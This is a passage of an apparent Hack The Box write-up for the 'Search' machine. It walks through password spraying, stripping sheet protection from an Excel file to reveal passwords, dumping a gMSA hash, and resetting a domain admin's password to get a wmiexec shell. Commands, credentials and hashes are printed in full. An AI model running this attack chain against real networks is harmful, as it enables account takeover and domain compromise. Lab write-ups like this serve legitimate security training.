+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby</code></pre><p>This user is compromised!</p><h2><code>RedirectedFolders$</code> share</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //research.search.htb/RedirectedFolders$ -U &#39;web_svc&#39;%&#39;@3ONEmillionbaby&#39;
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                  Dc        0  Tue May 19 20:13:28 2026
+  ..                                 Dc        0  Tue May 19 20:13:28 2026
+  abril.suarez                       Dc        0  Tue Apr  7 19:12:58 2020
+  Angie.Duffy                        Dc        0  Fri Jul 31 14:11:32 2020
+  Antony.Russo                       Dc        0  Fri Jul 31 13:35:32 2020
+  belen.compton                      Dc        0  Tue Apr  7 19:32:31 2020
+  Cameron.Melendez                   Dc        0  Fri Jul 31 13:37:36 2020
+  chanel.bell                        Dc        0  Tue Apr  7 19:15:09 2020
+  Claudia.Pugh                       Dc        0  Fri Jul 31 14:09:08 2020
+  Cortez.Hickman                     Dc        0  Fri Jul 31 13:02:04 2020
+  dax.santiago                       Dc        0  Tue Apr  7 19:20:08 2020
+  Eddie.Stevens                      Dc        0  Fri Jul 31 12:55:34 2020
+  edgar.jacobs                       Dc        0  Thu Apr  9 21:04:11 2020
+  Edith.Walls                        Dc        0  Fri Jul 31 13:39:50 2020
+  eve.galvan                         Dc        0  Tue Apr  7 19:23:13 2020
+  frederick.cuevas                   Dc        0  Tue Apr  7 19:29:22 2020
+  hope.sharp                         Dc        0  Thu Apr  9 15:34:41 2020
+  jayla.roberts                      Dc        0  Tue Apr  7 19:07:00 2020
+  Jordan.Gregory                     Dc        0  Fri Jul 31 14:01:06 2020
+  payton.harmon                      Dc        0  Thu Apr  9 21:11:39 2020
+  Reginald.Morton                    Dc        0  Fri Jul 31 12:44:32 2020
+  santino.benjamin                   Dc        0  Tue Apr  7 19:10:25 2020
+  Savanah.Velazquez                  Dc        0  Fri Jul 31 13:21:42 2020
+  sierra.frye                        Dc        0  Thu Nov 18 01:01:46 2021
+  trace.ryan                         Dc        0  Thu Apr  9 21:14:26 2020
+
+		3246079 blocks of size 4096. 740692 blocks available
+smb: \&gt; </code></pre><p>Looks to be all the user folders</p><p>I have read and write ab both of my compromised users!</p><h2>Password spray via password reuse</h2><p>Since this is a service account, another user is likely controller the service account making it likely to be password reuse</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb research.search.htb -u users.txt -p &#39;@3ONEmillionbaby&#39; --continue-on-success
+
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby</code></pre><p>I have compromised another user!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb research.search.htb -u edgar.jacobs -p &#39;@3ONEmillionbaby&#39; --shares
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby 
+SMB         10.129.229.57   445    RESEARCH         [*] Enumerated shares
+SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
+SMB         10.129.229.57   445    RESEARCH         -----           -----------     ------
+SMB         10.129.229.57   445    RESEARCH         ADMIN$                          Remote Admin
+SMB         10.129.229.57   445    RESEARCH         C$                              Default share
+SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.229.57   445    RESEARCH         helpdesk        READ            
+SMB         10.129.229.57   445    RESEARCH         IPC$            READ            Remote IPC
+SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share 
+SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRITE      
+SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share</code></pre><p>This user has read access on the <code>helpdesk</code> share</p><p>There is nothing in the helpdesk share</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smb: \edgar.jacobs\Desktop\&gt; ls
+  .                                 DRc        0  Mon Aug 10 11:02:16 2020
+  ..                                DRc        0  Mon Aug 10 11:02:16 2020
+  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 21:05:29 2020
+  desktop.ini                      AHSc      282  Mon Aug 10 11:02:16 2020
+  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 21:05:03 2020
+  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 11:35:44 2020
+
+		3246079 blocks of size 4096. 739700 blocks available
+smb: \edgar.jacobs\Desktop\&gt; get Phishing_Attempt.xlsx
+getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Phishing_Attempt.xlsx (223.6 KiloBytes/sec) (average 223.6 KiloBytes/sec)
+smb: \edgar.jacobs\Desktop\&gt;</code></pre><p>However <code>edgar.jacobs</code> user directory has a .xlsx file in the <code>RedirectedFolders$</code> share</p><p><img src="images/search/pasted-image-20260519203852.webp" alt="Screenshot" loading="lazy" /></p><p>It looks as if column C is hidden on this occasion, it likely contains some passwords!</p><h2>Extracting password from .xlsx file</h2><p>Since .xlsx files are just zipped archives of xml files ill unzip and see whats protecting the column</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">/xl/worksheets/sheet2.xml</code></pre><p>So after unzipping it and looking at the path above since im after sheet 2</p><p>I see something interesting at the bottom:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&lt;sheetProtection algorithmName=&quot;SHA-512&quot; hashValue=&quot;hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==&quot; saltValue=&quot;U9oZfaVCkz5jWdhs9AA8nA==&quot; spinCount=&quot;100000&quot; sheet=&quot;1&quot; objects=&quot;1&quot; scenarios=&quot;1&quot;/&gt;</code></pre><p>Looks like ive found a hash!</p><p>So in order to get around this ill place all extracted files in a directory called <code>xlsx</code> then ill open my file explorer and open the sheet2.xml file with a text editor and remove the <code>&lt;sheetProtection&gt;</code> tags, then i should be able to rezip the files and chnage the filetype back to .xlsx, then i should  be able to view the contents of the column.</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">zip -r cracked.xlsx.zip xl _rels docProps &#39;[Content_Types].xml&#39;</code></pre><p>So ive opened <code>sheet2.xml</code> in mousepad and removed the protection and saved my changes, now i can zip the 3 dirs and one xml file to make the complete file</p><p>Then using my archive manager ill make it a .xlsx file, and now i can reopen it!</p><p><img src="images/search/pasted-image-20260519210547.webp" alt="Screenshot" loading="lazy" /></p><p>Now i have access to that column</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat xlsx-passwords.txt 
+;;36!cried!INDIA!year!50;;
+..10-time-TALK-proud-66..
+??47^before^WORLD^surprise^91??
+//51+mountain+DEAR+noise+83//
+++47|building|WARSAW|gave|60++
+!!05_goes_SEVEN_offer_83!!
+~~27%when%VILLAGE%full%00~~
+$$49=wide=STRAIGHT=jordan=28$$18
+==95~pass~QUIET~austria~77==
+//61!banker!FANCY!measure!25//
+??40:student:MAYOR:been:66??
+&amp;&amp;75:major:RADIO:state:93&amp;&amp;
+**30*venus*BALL*office*42**
+**24&amp;moment&amp;BRAZIL&amp;members&amp;66**</code></pre><p>Ill select the full column and store them all in a txt file</p><h2>Password spray using extracted passwords</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb research.search.htb -u users.txt -p xlsx-passwords.txt --continue-on-success | grep &#39;\[+\]&#39; 
+SMB                      10.129.229.57   445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18</code></pre><p>So by explicitly grepping for <code>[+]</code> i can only pull out valid credentials</p><p>I have compromised another user!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smb: \sierra.frye\Downloads\Backups\&gt; ls
+  .                                 DHc        0  Mon Aug 10 21:39:17 2020
+  ..                                DHc        0  Mon Aug 10 21:39:17 2020
+  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 16:04:11 2020
+  staff.pfx                          Ac     4326  Mon Aug 10 21:39:17 2020
+
+		3246079 blocks of size 4096. 735726 blocks available
+smb: \sierra.frye\Downloads\Backups\&gt; mget *</code></pre><p>I have found certificates in the RedirectedFolders$ share, i also managed to grab the user flag</p><h2>Bloodhound</h2><p><img src="images/search/pasted-image-20260519212801.webp" alt="Screenshot" loading="lazy" /></p><p>I have ReadGMSAPassword on the <code>BIR-ADFS-GMSA$</code> machine account</p><h2>Compromising <code>BIR-ADFS-GMSA$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap research.search.htb -u sierra.frye -p &#39;$$49=wide=STRAIGHT=jordan=28$$18&#39; --gmsa
+LDAP        10.129.229.57   389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.229.57   389    RESEARCH         [+] search.htb\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18 
+LDAP        10.129.229.57   389    RESEARCH         [*] Getting GMSA Passwords
+LDAP        10.129.229.57   389    RESEARCH         Account: BIR-ADFS-GMSA$       NTLM: e1e9fd9e46d0d747e1595167eedcec0f     PrincipalsAllowedToReadPassword: ITSec</code></pre><p>Ill use nxc to dump the NLMT of the machine account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb research.search.htb -u &#39;BIR-ADFS-GMSA$&#39; -H &#39;e1e9fd9e46d0d747e1595167eedcec0f&#39;   
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\BIR-ADFS-GMSA$:e1e9fd9e46d0d747e1595167eedcec0f</code></pre><p>This machine account is compromised!</p><h2>Bloodhound on <code>BIR-ADFS-GMSA$</code></h2><p><img src="images/search/pasted-image-20260519213112.webp" alt="Screenshot" loading="lazy" /></p><p>I have GenericAll over the user <code>tristan.davies</code>, and that user is a domain admin!</p><h2>Domain admin abusing <code>GenericAll</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host research.search.htb -d search.htb -u &#39;BIR-ADFS-GMSA$&#39; -p &#39;:e1e9fd9e46d0d747e1595167eedcec0f&#39; set password &#39;tristan.davies&#39; &#39;Password123!&#39;
+
+[+] Password changed successfully!</code></pre><p>Ill change the users password using BloodyAD, other options with GenericAll include a Targeted Kerberoast or a Shadow Credentials attack, but for simplicity ill just change the users password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb research.search.htb -u &#39;tristan.davies&#39; -p &#39;Password123!&#39;                    
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\tristan.davies:Password123! (Pwn3d!)</code></pre><p>The <code>(Pwned!)</code> indicator shows admin access</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">impacket-wmiexec search.htb/&#39;tristan.davies&#39;:&#39;Password123!&#39;@research.search.htb
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+search\tristan.davies
+
+C:\&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+C:\&gt;</code></pre><p>But since RDP and WINRM are both closed i am limited in shell access, so wmiexec will do!</p><p>Domain Admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-vulncicada/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">VulnCicada</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-monteverde/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Monteverde</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
